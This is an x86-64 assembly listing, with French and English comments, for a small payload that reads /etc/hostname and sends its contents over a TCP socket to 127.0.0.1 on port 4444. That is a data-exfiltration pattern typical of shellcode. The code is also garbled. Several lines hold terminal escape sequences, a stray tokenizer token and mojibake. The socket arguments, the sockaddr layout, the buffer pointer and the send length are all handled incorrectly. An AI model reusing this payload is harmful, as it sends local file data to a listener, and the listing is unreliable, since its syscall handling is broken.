section .text
    global _start
_start:
    ; Ouvrir /etc/hostname en lecture seule
    mov rax, 2          ; Syscall number for open
    mov rdi, filename   ; File name
    mov rsi, 0           ; Flags (O_RDONLY)
    syscall              ; Invoke the syscall

    ; Lire le contenu dans un buffer sur la pile
    mov rdi, rax          ; File descriptor
    sub rsp, 64            ; Allocate space on stack for read buffer
    mov rsi, rsp           ; Pointer to allocated space
    mov rdx, 64            ; Number of bytes to read
    mov rax, 0             ; Syscall number for read
    syscall                ; Invoke the syscall

    ; CrÃ©er un socket TCP AF_INET
    xor rax, rax          ; Zero out rax (syscall number)
    add al, 41             ; Syscall number for socketcall with SYS_SOCKET
    push byte 0x2           ; Protocol (IPPROTO_TCP = 6)
    push byte 0x1           ; Type (SOCK_STREAM = 1)
    push byte 0x2           ; AF_INET (2)
    mov rdi, rsp            ; Pointer to arguments
    syscall                ; Invoke the syscall
    mov r12, rax          ; Save socket descriptor in r12

    ; PrÃ©parer sockaddr_in sur la pile
    sub rsp, 0x10           ; Allocate space on stack for sockaddr_in struc[5D[K
structure
    xor rax, rax            ; Zero out rax (syscall number)
    mov [rsp + 2], ax       ; IP address (127.0.<ï½beginâofâsentenceï½>.<3>[5D[K
>.<3> = 0x0100007f)
    mov [rsp + 0], word 0x5c11   ; Port (4444)
    mov [rsp + 4], byte 2     ; AF_INET (2)
    xor rax, rax            ; Zero out rax (syscall number)
    add al, 42             ; Syscall number for connect
    mov rdi, r12           ; Socket descriptor
    mov rsi, rsp            ; Pointer to sockaddr_in structure
    mov rdx, 0x10           ; Size of sockaddr_in structure
    syscall                ; Invoke the syscall

    ; Envoyer les donnÃ©es lues via le socket
    mov rdi, r12          ; Socket descriptor
    mov rsi, rsp            ; Pointer to read buffer
    sub rdx, rax           ; Number of bytes to send (size of read buffer -[1D[K
- number of bytes read)
    xor rax, rax          ; Zero out rax (syscall number)
    add al, 1              ; Syscall number for write
    syscall                ; Invoke the syscall

    ; Terminer le processus proprement
    xor rdi, rdi           ; Exit code = 0
    mov rax, 60            ; Syscall number for exit
    syscall                ; Invoke the syscall
filename db '/etc/hostname', 0